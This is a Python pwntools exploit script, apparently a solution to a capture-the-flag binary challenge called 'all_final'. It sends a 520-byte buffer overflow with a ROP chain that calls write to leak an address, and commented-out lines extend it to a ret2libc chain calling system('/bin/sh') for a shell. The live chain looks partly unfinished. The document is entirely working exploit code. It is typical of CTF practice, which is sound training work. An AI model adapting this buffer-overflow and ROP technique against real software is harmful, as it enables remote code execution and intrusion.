from pwn import *

# context.log_level = 'debug'

elf = context.binary = ELF('./all_final')
libc = elf.libc
context.binary = elf
p = elf.process()
# p = remote('challs.n00bzunit3d.xyz', 42450)

offset = 520

rop = ROP(elf)
mov_rdi = 0x0000000000401254
write = elf.symbols['write']
main = elf.symbols['main']


payload = b"A"*offset + p64(mov_rdi) + p64(write) + p64(main)

# print(payload)
p.recvuntil('> ')
# gdb.attach(p)

p.sendline(payload)


# leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# print(f'puts: {hex(leak)}')

# libc.address = leak - libc.symbols['puts']

# rop = ROP(libc)
# # rop.call('puts', [next(libc.search(b'/bin/sh\x00'))])
# rop.call('system', [next(libc.search(b'/bin/sh\x00'))])


# payload = [
#     b'A' * offset,
#     p64(0x000000000040101a), #ret
#     rop.chain()
# ]

# payload = b''.join(payload)
# print(payload)
# print(len(payload))

# p.recv()
# p.sendline(payload)
# p.recv()

p.interactive()